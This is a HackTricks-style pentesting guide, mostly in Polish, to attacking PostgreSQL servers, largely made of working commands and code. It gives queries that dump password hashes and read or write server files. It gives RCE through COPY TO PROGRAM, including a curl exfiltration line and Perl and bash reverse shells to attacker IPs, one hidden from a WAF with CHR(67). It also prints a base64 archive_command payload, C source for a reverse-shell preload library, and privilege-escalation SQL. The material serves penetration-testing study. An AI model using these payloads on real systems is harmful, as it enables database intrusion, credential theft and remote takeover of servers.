# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Podstawowe informacje**

**PostgreSQL** jest opisywany jako **obiektowo-relacyjny system bazodanowy**, który jest **otwartoźródłowy**. Ten system nie tylko wykorzystuje język SQL, ale także rozszerza go dodatkowymi funkcjami. Jego możliwości pozwalają na obsługę szerokiego zakresu typów danych i operacji, co czyni go wszechstronnym wyborem dla programistów i organizacji.

**Domyślny port:** 5432 — jeśli ten port jest już używany, wygląda na to, że postgresql użyje następnego portu (prawdopodobnie 5433), który nie jest używany.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Połączenie & Basic Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Jeśli po uruchomieniu **`\list`** znajdziesz bazę danych o nazwie **`rdsadmin`**, wiesz, że jesteś w środku **AWS postgresql database**.

Aby uzyskać więcej informacji o **tym, jak wykorzystywać bazę danych PostgreSQL**, zobacz:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatyczna enumeracja
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Zgodnie z [**this research**](https://www.exploit-db.com/papers/13084), gdy próba połączenia zakończy się niepowodzeniem, `dblink` zgłasza wyjątek `sqlclient_unable_to_establish_sqlconnection`, zawierający wyjaśnienie błędu. Poniżej znajdują się przykłady tych szczegółów.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host jest nieosiągalny

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port jest zamknięty
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port jest otwarty
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
lub
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port jest otwarty lub filtrowany
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
W funkcjach PL/pgSQL obecnie nie da się uzyskać szczegółów wyjątku. Jednak jeśli masz bezpośredni dostęp do serwera PostgreSQL, możesz pozyskać potrzebne informacje. Jeśli wyodrębnienie usernames i passwords z tabel systemowych nie jest możliwe, możesz rozważyć wykorzystanie wordlist attack method omówionej w poprzedniej sekcji, ponieważ może to dać pozytywne rezultaty.

## Enumeration of Privileges

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rola ma uprawnienia superużytkownika                                                                                                                |
| rolinherit     | Rola automatycznie dziedziczy uprawnienia ról, których jest członkiem                                                                               |
| rolcreaterole  | Rola może tworzyć kolejne role                                                                                                                       |
| rolcreatedb    | Rola może tworzyć bazy danych                                                                                                                        |
| rolcanlogin    | Rola może się logować. To oznacza, że ta rola może być użyta jako początkowy identyfikator autoryzacji sesji                                          |
| rolreplication | Rola jest rolą replikacji. Rola replikacji może inicjować połączenia replikacyjne oraz tworzyć i usuwać replication slots                             |
| rolconnlimit   | Dla ról, które mogą się logować, to ustawia maksymalną liczbę jednoczesnych połączeń, które ta rola może nawiązać. -1 oznacza brak limitu.             |
| rolpassword    | Nie hasło (zawsze odczytywane jako `********`)                                                                                                      |
| rolvaliduntil  | Czas wygaśnięcia hasła (używane tylko dla uwierzytelniania hasłem); null jeśli brak wygaśnięcia                                                     |
| rolbypassrls   | Rola omija każdą politykę row-level security — zobacz [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) for more information. |
| rolconfig      | Domyślne ustawienia specyficzne dla roli dla zmiennych konfiguracyjnych w czasie wykonywania                                                        |
| oid            | ID roli                                                                                                                                             |

#### Interesting Groups

- If you are a member of **`pg_execute_server_program`** you can **wykonywać** programs
- If you are a member of **`pg_read_server_files`** you can **czytać** files
- If you are a member of **`pg_write_server_files`** you can **zapisywać** files

> [!TIP]
> Zwróć uwagę, że w Postgres **user**, **group** i **role** to **to samo**. Zależy to od tego, **jak ich używasz**, i czy **pozwalasz im się zalogować**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcje
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Operacje na systemie plików

### Odczyt katalogów i plików

Na podstawie tego [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) członkowie zdefiniowanej grupy **`DEFAULT_ROLE_READ_SERVER_FILES`** (zwanej **`pg_read_server_files`**) oraz **super users** mogą używać metody **`COPY`** dla dowolnej ścieżki (zobacz `convert_and_check_filename` w `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś superuser, ale masz uprawnienie **CREATEROLE**, możesz **uczynić siebie członkiem tej grupy:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Są **inne funkcje postgres**, które można użyć do **odczytania pliku lub wylistowania katalogu**. Tylko **superusers** i **użytkownicy z eksplicytnymi uprawnieniami** mogą ich używać:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Znajdziesz **więcej funkcji** w [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Proste zapisywanie plików

Tylko **super users** i członkowie **`pg_write_server_files`** mogą używać copy do zapisywania plików.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś super user ale masz uprawnienie **`CREATEROLE`** możesz **uczynić siebie członkiem tej grupy:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Pamiętaj, że COPY cannot handle newline chars, therefore even if you are using a base64 payload musisz wysłać **jednowierszowy payload**.\
Bardzo istotnym ograniczeniem tej techniki jest to, że **`copy` cannot be used to write binary files as it modify some binary values.**

### **Przesyłanie plików binarnych**

Istnieją jednak **inne techniki pozwalające przesłać duże pliki binarne:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Aktualizacja danych tabeli PostgreSQL poprzez zapis lokalnego pliku

Jeśli masz niezbędne uprawnienia do odczytu i zapisu plików serwera PostgreSQL, możesz zmodyfikować dowolną tabelę na serwerze przez **nadpisanie powiązanego filenode** w [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **Więcej na ten temat** [**tutaj**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Wymagane kroki:

1.  Odnajdź katalog danych PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Uwaga:** Jeśli nie jesteś w stanie pobrać bieżącej ścieżki katalogu danych z ustawień, możesz zapytać o główną wersję PostgreSQL za pomocą zapytania `SELECT version()` i spróbować odgadnąć tę ścieżkę. Typowe ścieżki katalogu danych w instalacjach PostgreSQL na Unix to `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Powszechną nazwą klastra jest `main`.

2.  Uzyskaj względną ścieżkę do filenode powiązanego z docelową tabelą

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

To zapytanie powinno zwrócić coś w rodzaju `base/3/1337`. Pełna ścieżka na dysku to `$DATA_DIRECTORY/base/3/1337`, np. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Pobierz filenode za pomocą funkcji `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Uzyskaj typy kolumn powiązane z docelową tabelą

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Użyj [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) aby [edytować filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); ustaw wszystkie flagi boolowskie `rol*` na 1, by nadać pełne uprawnienia.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![Demo edytora filenode PostgreSQL](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Prześlij ponownie zmodyfikowany filenode za pomocą funkcji `lo_*`, i nadpisz oryginalny plik na dysku

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcjonalnie)_ Wyczyść cache tabel w pamięci uruchamiając kosztowne zapytanie SQL

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Powinieneś teraz zobaczyć zaktualizowane wartości tabeli w PostgreSQL.

Możesz też zostać superadminem przez edycję tabeli `pg_authid`. **Zobacz** [**następną sekcję**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE do programu**

Od[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), tylko **super users** i członkowie grupy **`pg_execute_server_program`** mogą używać copy do RCE (przykład z exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Przykład do exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Pamiętaj, że jeśli nie jesteś superuserem, ale masz uprawnienie **`CREATEROLE`**, możesz **uczynić siebie członkiem tej grupy:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Więcej informacji.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Albo użyj modułu `multi/postgres/postgres_copy_from_program_cmd_exec` z **metasploit**.\
Więcej informacji o tej podatności [**tutaj**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Choć zgłoszono ją jako CVE-2019-9193, Postges oświadczył, że to [funkcja i nie zostanie naprawiona](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Omijanie filtrów słów kluczowych/WAF, aby dotrzeć do COPY PROGRAM

W kontekstach SQLi ze stacked queries WAF może usunąć lub zablokować dosłowne słowo kluczowe `COPY`. Możesz dynamicznie zbudować instrukcję i wykonać ją wewnątrz bloku PL/pgSQL DO. Na przykład zbuduj wiodące C za pomocą `CHR(67)`, aby ominąć proste filtry i EXECUTE złożone polecenie:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Ten wzorzec omija statyczne filtrowanie słów kluczowych i nadal umożliwia wykonywanie poleceń systemu operacyjnego za pomocą `COPY ... PROGRAM`. Jest szczególnie przydatny, gdy aplikacja wypisuje błędy SQL i pozwala na zapytania łączone.

### RCE z użyciem języków PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE z rozszerzeniami PostgreSQL

Gdy z poprzedniego wpisu **nauczyłeś się**, **jak przesłać pliki binarne**, możesz spróbować uzyskać **RCE przesyłając rozszerzenie postgresql i ładując je**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE z pliku konfiguracyjnego PostgreSQL

> [!TIP]
> Poniższe wektory RCE są szczególnie przydatne w ograniczonych kontekstach SQLi, ponieważ wszystkie kroki można wykonać za pomocą zagnieżdżonych instrukcji SELECT

Plik **konfiguracyjny** PostgreSQL jest **zapisywalny** przez użytkownika **postgres**, który uruchamia bazę danych; jako **superuser** możesz zapisywać pliki w systemie plików, i w związku z tym możesz **nadpisać ten plik.**

![](<../images/image (322).png>)

#### **RCE z ssl_passphrase_command**

Więcej informacji [o tej technice tutaj](https://pulsesecurity.co.nz/articles/postgres-sqli).

Plik konfiguracyjny ma kilka interesujących atrybutów, które mogą prowadzić do RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Ścieżka do klucza prywatnego bazy danych
- `ssl_passphrase_command = ''` Jeśli prywatny plik jest chroniony hasłem (zaszyfrowany), postgresql **wykona polecenie wskazane w tym atrybucie**.
- `ssl_passphrase_command_supports_reload = off` Jeśli ten atrybut jest **on**, to **polecenie** wykonywane, gdy klucz jest chroniony hasłem, zostanie wykonane podczas wywołania `pg_reload_conf()`.

W takim razie atakujący będzie musiał:

1. **Zrzucić klucz prywatny** z serwera
2. **Zaszyfrować** pobrany klucz prywatny:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Nadpisać**
4. **Zrzucić** aktualną postgresql **konfigurację**
5. **Nadpisać** konfigurację ustawieniami wymienionymi poniżej:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Wykonać `pg_reload_conf()`

Podczas testów zauważyłem, że to zadziała tylko jeśli **plik klucza prywatnego ma uprawnienia 640**, jest **własnością root** oraz należy do **grupy ssl-cert lub postgres** (tak aby użytkownik postgres mógł go odczytać), i znajduje się w _/var/lib/postgresql/12/main_.

#### **RCE z archive_command**

Więcej [informacji o tej konfiguracji i o WAL znajdziesz tutaj](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3).

Innym atrybutem w pliku konfiguracyjnym, który można wykorzystać, jest `archive_command`.

Aby to zadziałało, ustawienie `archive_mode` musi być `'on'` lub `'always'`. Jeśli tak jest, możemy nadpisać polecenie w `archive_command` i wymusić jego wykonanie przez operacje WAL (write-ahead logging).

Ogólne kroki są następujące:

1. Sprawdzić, czy archive mode jest włączony: `SELECT current_setting('archive_mode')`
2. Nadpisać `archive_command` ładunkiem. Na przykład reverse shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RETU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREU..., base64 --decode | perl'`
3. Przeładować konfigurację: `SELECT pg_reload_conf()`
4. Wymusić wykonanie operacji WAL, która wywoła archive command: `SELECT pg_switch_wal()` lub `SELECT pg_switch_xlog()` w niektórych wersjach Postgresa

##### Edycja postgresql.conf przez Large Objects (przyjazne SQLi)

Gdy potrzebne są zapisy wieloliniowe (np. ustawienie wielu GUC), użyj PostgreSQL Large Objects aby odczytać i nadpisać konfigurację całkowicie z poziomu SQL. To podejście jest idealne w kontekstach SQLi, gdy `COPY` nie radzi sobie z nowymi liniami lub zapisami bezpiecznymi dla binarnych danych.

Przykład (dostosuj główną wersję i ścieżkę w razie potrzeby, np. wersja 15 na Debianie):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- libraries that will be loaded by the PostgreSQL server at the client connection.
- `dynamic_library_path` -- list of directories where the PostgreSQL server will search for the libraries.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

So, if you have **`CREATEROLE`** permission you could grant yourself access to other **roles** (that aren't superuser) that can give you the option to read & write files and execute commands:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Zmiana hasła

Użytkownicy z tą rolą mogą również **zmieniać** **hasła** innych **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Dość często zdarza się, że **lokalni użytkownicy mogą logować się do PostgreSQL bez podawania hasła**. Dlatego, gdy zdobędziesz **uprawnienia do wykonywania kodu**, możesz nadużyć tych uprawnień, aby przyznać sobie rolę **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Zwykle jest to możliwe z powodu następujących linii w pliku **`pg_hba.conf`**:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

W [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wyjaśniono, jak było możliwe wykonanie **privesc** w Postgres GCP poprzez nadużycie uprawnienia ALTER TABLE, które zostało przyznane użytkownikowi.

Kiedy próbujesz **uczynić innego użytkownika właścicielem tabeli**, powinieneś otrzymać **błąd** uniemożliwiający to, ale najwyraźniej GCP przyznał tę **opcję użytkownikowi postgres, który nie był superuserem** w GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Łącząc ten pomysł z faktem, że gdy polecenia **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) są wykonywane na **tabeli z funkcją indeksu**, ta **funkcja** jest **wywoływana** w ramach polecenia z uprawnieniami **właściciela** tabeli. Możliwe jest utworzenie indeksu z funkcją i nadanie uprawnień właściciela tej tabeli **super user**owi, a następnie uruchomienie ANALYZE na tabeli z złośliwą funkcją, która będzie mogła wykonywać polecenia, ponieważ używa uprawnień właściciela.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Rozpocznij od utworzenia nowej tabeli.
2. Wstaw do tabeli kilka nieistotnych danych, aby zapewnić dane dla funkcji indeksu.
3. Opracuj złośliwą funkcję indeksu zawierającą code execution payload, pozwalającą na wykonanie nieautoryzowanych poleceń.
4. Użyj ALTER, aby zmienić właściciela tabeli na "cloudsqladmin", który jest rolą superużytkownika w GCP używaną wyłącznie przez Cloud SQL do zarządzania i utrzymania bazy danych.
5. Przeprowadź operację ANALYZE na tabeli. Ta akcja zmusza silnik PostgreSQL do przełączenia się na kontekst użytkownika właściciela tabeli, "cloudsqladmin". W konsekwencji złośliwa funkcja indeksu zostaje wywołana z uprawnieniami "cloudsqladmin", co umożliwia wykonanie wcześniej nieautoryzowanego polecenia powłoki.

W PostgreSQL ten przebieg wygląda mniej więcej tak:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Następnie tabela `shell_commands_results` będzie zawierać wyjście wykonanego kodu:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalne logowanie

Niektóre źle skonfigurowane instancje postgresql mogą pozwalać na logowanie dowolnego lokalnego użytkownika — możliwe jest zalogowanie się z 127.0.0.1 przy użyciu funkcji **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Zwróć uwagę, że aby poprzednie zapytanie zadziałało **funkcja `dblink` musi istnieć**. Jeśli nie istnieje, możesz spróbować ją utworzyć za pomocą
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Jeśli masz hasło użytkownika z większymi uprawnieniami, ale użytkownikowi nie zezwolono na logowanie z zewnętrznego adresu IP, możesz użyć poniższej funkcji, aby wykonywać zapytania jako ten użytkownik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Można sprawdzić, czy ta funkcja istnieje za pomocą:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Funkcja zdefiniowana przez użytkownika z** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters byli w stanie privesc w instancji postgres udostępnionej przez IBM, ponieważ **znaleźli tę funkcję z flagą SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) funkcja z **SECURITY DEFINER** jest wykonywana z uprawnieniami **użytkownika, który jest jej właścicielem**. Dlatego, jeśli funkcja jest podatna na **SQL Injection** lub wykonuje jakieś **uprzywilejowane działania z params kontrolowanymi przez attacker**, może być nadużyta do **escalate privileges inside postgres**.

W linii 4 poprzedniego kodu widać, że funkcja ma flagę **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A następnie **wykonaj polecenia**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

